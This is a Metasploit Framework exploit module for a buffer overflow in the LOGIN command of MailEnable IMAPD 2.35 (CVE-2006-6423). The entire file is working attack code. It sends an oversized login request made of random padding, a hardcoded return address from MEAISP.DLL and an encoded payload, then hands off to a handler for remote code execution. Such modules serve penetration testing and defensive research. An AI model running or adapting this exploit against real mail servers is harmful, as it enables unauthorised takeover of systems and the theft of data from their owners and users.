##
# $Id: mailenable_login.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'MailEnable IMAPD (2.35) Login Request Buffer Overflow\',
			\'Description\'    => %q{
					MailEnable\'s IMAP server contains a buffer overflow
				vulnerability in the Login command.
			},
			\'Author\'         => [ \'MC\' ],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 9179 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2006-6423\'],
					[ \'OSVDB\', \'32125\'],
					[ \'BID\', \'21492\'],
					[ \'URL\', \'http://lists.grok.org.uk/pipermail/full-disclosure/2006-December/051229.html\'],
				],
			\'Privileged\'     => true,
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 450,
					\'BadChars\' => \"\\x00\\x0a\\x0d\\x20\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'MailEnable 2.35 Pro\',  { \'Ret\' =>  0x10049abb } ], #MEAISP.DLL
				],
			\'DisclosureDate\' => \'Dec 11 2006\',
			\'DefaultTarget\' => 0))

		register_options( [ Opt::RPORT(143) ], self.class )
	end

	def exploit
		connect

		auth	=   \"a001 LOGIN \" + rand_text_alpha_upper(4) + \" {10}\\r\\n\"
		sploit	=   rand_text_alpha_upper(556) + [target.ret].pack(\'V\')
		sploit	<<  payload.encoded + \"\\r\\n\\r\\n\"

		res = sock.recv(50)
			if ( res =~ / OK IMAP4rev1/)
				print_status(\"Trying target #{target.name}...\")
				sock.put(auth)
				sock.get_once(-1, 3)
				sock.put(sploit)
			else
				print_status(\"Not running IMAP4rev1...\")
			end

		handler
		disconnect
	end

end
